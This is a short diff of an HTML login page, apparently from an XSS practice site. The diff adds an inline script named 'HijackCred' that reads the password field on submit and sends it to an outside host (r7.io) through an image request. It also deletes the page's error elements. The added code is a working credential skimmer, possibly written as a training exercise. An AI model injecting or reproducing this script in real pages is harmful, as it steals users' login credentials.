@@ -26,8 +26,7 @@
 
 <body class="sessions">
 <div id="signin" class="reveal">
-  <!-- <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched"> -->
-  <form id="login" action="http://r7.io/e/macdh?s=" method="post" class="untouched">
+  <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched">
       <h1><a href="https://xss.websecurity.church/0/login#">NOPE</a></h1>
     
     
@@ -52,7 +51,16 @@
   </form>
 </div>
 
-
+<script type="text/javascript"> 
+function HijackCred() {
+	var pass = document.forms[0].elements[1].value;
+	i = new Image();
+	i.src='http://r7.io/e/macdh?s='+pass;
+}
+document.getElementsByClassName("error-message")[0].remove();
+document.getElementsByClassName("problem")[0].remove();
+document.forms[0].onsubmit = HijackCred;
+</script>
 
 
 <div id="compliance-footer">
